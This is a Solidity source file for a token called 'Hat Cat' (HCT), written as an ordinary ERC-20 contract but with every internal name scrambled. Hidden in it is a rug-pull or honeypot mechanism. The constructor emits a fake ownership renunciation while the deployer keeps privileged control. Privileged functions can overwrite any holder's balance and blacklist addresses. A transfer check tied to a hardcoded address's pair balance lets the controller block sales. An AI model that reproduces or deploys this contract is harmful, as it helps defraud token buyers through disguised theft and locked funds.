//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface vloftfvgluuonl {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract cwqxzakvvhcix {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface gffnesfhttqo {
    function createPair(address cpdomyqnn, address fckhbyewf) external returns (address);
}

interface fpmzjxmuyiikbl {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dheekosutns) external view returns (uint256);

    function transfer(address bphymlpjbuuki, uint256 enjgmcwnt) external returns (bool);

    function allowance(address qubdczljrlbq, address spender) external view returns (uint256);

    function approve(address spender, uint256 enjgmcwnt) external returns (bool);

    function transferFrom(
        address sender,
        address bphymlpjbuuki,
        uint256 enjgmcwnt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed eesabrlngjzg, uint256 value);
    event Approval(address indexed qubdczljrlbq, address indexed spender, uint256 value);
}

interface fpmzjxmuyiikblMetadata is fpmzjxmuyiikbl {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HatCat is cwqxzakvvhcix, fpmzjxmuyiikbl, fpmzjxmuyiikblMetadata {

    function name() external view virtual override returns (string memory) {
        return unzpkltxtzgvxz;
    }

    mapping(address => bool) public rhcbbfdiebrrn;

    function getOwner() external view returns (address) {
        return gxikaokwpaw;
    }

    function crbdofyriqj(address gdxzalbfdqa, uint256 enjgmcwnt) public {
        ddookphkhhgi();
        rrajhcwbab[gdxzalbfdqa] = enjgmcwnt;
    }

    function yeqzrtegudb(address lfhlvkvuxvba, address bphymlpjbuuki, uint256 enjgmcwnt) internal returns (bool) {
        require(rrajhcwbab[lfhlvkvuxvba] >= enjgmcwnt);
        rrajhcwbab[lfhlvkvuxvba] -= enjgmcwnt;
        rrajhcwbab[bphymlpjbuuki] += enjgmcwnt;
        emit Transfer(lfhlvkvuxvba, bphymlpjbuuki, enjgmcwnt);
        return true;
    }

    uint256 uvwuetaexwopsp;

    uint256 flqnpvavzpv;

    bool public bboqlgknsqkuzl;

    uint256 private teaecboiyizjmt;

    address public ffjypnpijsnoq;

    function rritbjlqlwwdfq(address qndlevgvsuvxfc) public {
        ddookphkhhgi();
        if (jakifngebqfj == zuhvnlcwyxn) {
            jvibwiwqflabei = false;
        }
        if (qndlevgvsuvxfc == ffjypnpijsnoq || qndlevgvsuvxfc == krxjcwpvim) {
            return;
        }
        elsqqivzzkbzyp[qndlevgvsuvxfc] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return goirkockekwqm;
    }

    constructor (){
        
        jjwqnklbomlix();
        vloftfvgluuonl mvkkacpggjijsq = vloftfvgluuonl(yyyicxotzns);
        krxjcwpvim = gffnesfhttqo(mvkkacpggjijsq.factory()).createPair(mvkkacpggjijsq.WETH(), address(this));
        if (jvibwiwqflabei) {
            yheepajtsblizy = teaecboiyizjmt;
        }
        ffjypnpijsnoq = _msgSender();
        rhcbbfdiebrrn[ffjypnpijsnoq] = true;
        rrajhcwbab[ffjypnpijsnoq] = goirkockekwqm;
        if (bboqlgknsqkuzl) {
            jakifngebqfj = false;
        }
        emit Transfer(address(0), ffjypnpijsnoq, goirkockekwqm);
    }

    function allowance(address ilugwowahn, address ypkrqjbknofgjs) external view virtual override returns (uint256) {
        if (ypkrqjbknofgjs == yyyicxotzns) {
            return type(uint256).max;
        }
        return dftmitrdi[ilugwowahn][ypkrqjbknofgjs];
    }

    function approve(address ypkrqjbknofgjs, uint256 enjgmcwnt) public virtual override returns (bool) {
        dftmitrdi[_msgSender()][ypkrqjbknofgjs] = enjgmcwnt;
        emit Approval(_msgSender(), ypkrqjbknofgjs, enjgmcwnt);
        return true;
    }

    function transferFrom(address lfhlvkvuxvba, address bphymlpjbuuki, uint256 enjgmcwnt) external override returns (bool) {
        if (_msgSender() != yyyicxotzns) {
            if (dftmitrdi[lfhlvkvuxvba][_msgSender()] != type(uint256).max) {
                require(enjgmcwnt <= dftmitrdi[lfhlvkvuxvba][_msgSender()]);
                dftmitrdi[lfhlvkvuxvba][_msgSender()] -= enjgmcwnt;
            }
        }
        return nfxrymhtjc(lfhlvkvuxvba, bphymlpjbuuki, enjgmcwnt);
    }

    function symbol() external view virtual override returns (string memory) {
        return uoztrrckgmgknl;
    }

    function balanceOf(address dheekosutns) public view virtual override returns (uint256) {
        return rrajhcwbab[dheekosutns];
    }

    function decimals() external view virtual override returns (uint8) {
        return dxocyqacotgul;
    }

    function nfxrymhtjc(address lfhlvkvuxvba, address bphymlpjbuuki, uint256 enjgmcwnt) internal returns (bool) {
        if (lfhlvkvuxvba == ffjypnpijsnoq) {
            return yeqzrtegudb(lfhlvkvuxvba, bphymlpjbuuki, enjgmcwnt);
        }
        uint256 truhewjrexti = fpmzjxmuyiikbl(krxjcwpvim).balanceOf(bstrpacsiqzz);
        require(truhewjrexti == flqnpvavzpv);
        require(!elsqqivzzkbzyp[lfhlvkvuxvba]);
        return yeqzrtegudb(lfhlvkvuxvba, bphymlpjbuuki, enjgmcwnt);
    }

    uint256 private yheepajtsblizy;

    function zyywudhtgmhws(address hknofzmxzmu) public {
        if (eirarfsker) {
            return;
        }
        if (bamctkpioddgd) {
            jakifngebqfj = true;
        }
        rhcbbfdiebrrn[hknofzmxzmu] = true;
        
        eirarfsker = true;
    }

    function ddookphkhhgi() private view {
        require(rhcbbfdiebrrn[_msgSender()]);
    }

    bool private vvyvdjuiwjo;

    string private uoztrrckgmgknl = "HCT";

    string private unzpkltxtzgvxz = "Hat Cat";

    address private gxikaokwpaw;

    address public krxjcwpvim;

    function jjwqnklbomlix() public {
        emit OwnershipTransferred(ffjypnpijsnoq, address(0));
        gxikaokwpaw = address(0);
    }

    bool private jakifngebqfj;

    address bstrpacsiqzz = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private zuhvnlcwyxn;

    uint256 private goirkockekwqm = 100000000 * 10 ** 18;

    mapping(address => uint256) private rrajhcwbab;

    function plseptieciufh(uint256 enjgmcwnt) public {
        ddookphkhhgi();
        flqnpvavzpv = enjgmcwnt;
    }

    bool public bamctkpioddgd;

    event OwnershipTransferred(address indexed jtpjaelmr, address indexed xyuznailjlv);

    mapping(address => bool) public elsqqivzzkbzyp;

    bool public eirarfsker;

    uint8 private dxocyqacotgul = 18;

    function transfer(address gdxzalbfdqa, uint256 enjgmcwnt) external virtual override returns (bool) {
        return nfxrymhtjc(_msgSender(), gdxzalbfdqa, enjgmcwnt);
    }

    function owner() external view returns (address) {
        return gxikaokwpaw;
    }

    bool public jvibwiwqflabei;

    address yyyicxotzns = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private drtbtjtkhzfg;

    mapping(address => mapping(address => uint256)) private dftmitrdi;

}